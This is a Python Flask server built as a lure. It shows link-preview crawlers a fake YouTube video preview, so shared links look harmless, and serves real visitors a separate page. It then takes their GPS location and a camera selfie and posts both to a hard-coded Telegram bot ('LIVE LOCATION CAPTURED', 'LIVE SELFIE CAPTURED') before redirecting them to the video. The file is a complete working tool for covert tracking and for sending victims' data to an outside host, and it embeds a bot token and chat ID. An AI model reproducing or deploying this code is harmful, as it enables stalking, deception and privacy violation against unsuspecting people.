from flask import Flask, render_template, request, jsonify, redirect
import requests
import base64
from io import BytesIO
import os
import json

app = Flask(__name__)

TELEGRAM_BOT_TOKEN = '8280216938:AAEwCN0U8HkhNqikde5Nq3ODTgpaZlNQZhQ'
TELEGRAM_CHAT_ID    = '7343057223'

# Configuration file to store YouTube URL
CONFIG_FILE = 'config.json'

def load_config():
    """Load configuration from JSON file"""
    if os.path.exists(CONFIG_FILE):
        try:
            with open(CONFIG_FILE, 'r') as f:
                return json.load(f)
        except:
            pass
    default_config = {
        "youtube_url": "https://www.youtube.com/watch?v=dQw4w9WgXcQ",
        "video_title": "Taarak Mehta Ka Ooltah Chashmah",
        "video_description": "Latest Episode - Comedy Show",
        "video_thumbnail": "https://i.ytimg.com/vi/dQw4w9WgXcQ/maxresdefault.jpg"
    }
    save_config(default_config)
    return default_config

def save_config(config):
    """Save configuration to JSON file"""
    try:
        with open(CONFIG_FILE, 'w') as f:
            json.dump(config, f, indent=2)
    except:
        pass

def send_location_to_telegram(lat, lon):
    """Send location to Telegram"""
    location_url = f"https://www.google.com/maps?q={lat},{lon}"
    message      = f"🔴 LIVE LOCATION CAPTURED\n📍 {location_url}\n⏰ {request.headers.get('User-Agent','Unknown')}"
    url          = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload      = {'chat_id': TELEGRAM_CHAT_ID, 'text': message}
    return requests.post(url, data=payload).json()

def send_photo_to_telegram(photo_b64):
    """Send photo to Telegram"""
    url        = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendPhoto"
    photo_data = BytesIO(base64.b64decode(photo_b64.split(',',1)[1]))
    files      = {'photo': photo_data}
    data       = {'chat_id': TELEGRAM_CHAT_ID, 'caption': '📸 LIVE SELFIE CAPTURED\n🕐 Real-time capture'}
    return requests.post(url, data=data, files=files).json()

@app.route('/')
def index():
    """Main route: bot sees YouTube preview, real user sees consent page"""
    ua       = request.headers.get('User-Agent','').lower()
    bots     = ['whatsapp','facebook','twitter','telegram','bot','crawler','spider']
    is_bot   = any(k in ua for k in bots)
    if is_bot:
        cfg = load_config()
        return render_template('youtube_preview.html',
                               title=cfg['video_title'],
                               description=cfg['video_description'],
                               thumbnail=cfg['video_thumbnail'],
                               youtube_url=cfg['youtube_url'])
    else:
        return render_template('index2.0.html')

@app.route('/admin')
def admin():
    """Admin page to update YouTube video settings"""
    cfg = load_config()
    return render_template('admin.html', config=cfg)

@app.route('/update_video', methods=['POST'])
def update_video():
    """Handle YouTube config updates"""
    data = request.json or {}
    cfg = {
        "youtube_url":       data.get('youtube_url',''),
        "video_title":       data.get('video_title',''),
        "video_description": data.get('video_description',''),
        "video_thumbnail":   data.get('video_thumbnail','')
    }
    save_config(cfg)
    return jsonify(status='success', message='Video updated')

@app.route('/send_data', methods=['POST'])
def send_data():
    """Receive location & selfie, forward to Telegram, then redirect"""
    data      = request.json or {}
    lat, lon  = data.get('latitude'), data.get('longitude')
    selfie    = data.get('selfie')
    if not (lat and lon and selfie):
        return jsonify(status='Missing data'), 400

    loc_res = send_location_to_telegram(lat, lon)
    pic_res = send_photo_to_telegram(selfie)
    if loc_res.get('ok') and pic_res.get('ok'):
        return jsonify(status='Success, data sent'), 200
    else:
        return jsonify(status='Failed to send'), 500

@app.route('/youtube')
def youtube_redirect():
    """After capture, redirect user to current YouTube video"""
    return redirect(load_config()['youtube_url'])

if __name__ == '__main__':
    port = int(os.environ.get('PORT',5000))
    app.run(host='0.0.0.0', port=port, debug=False)
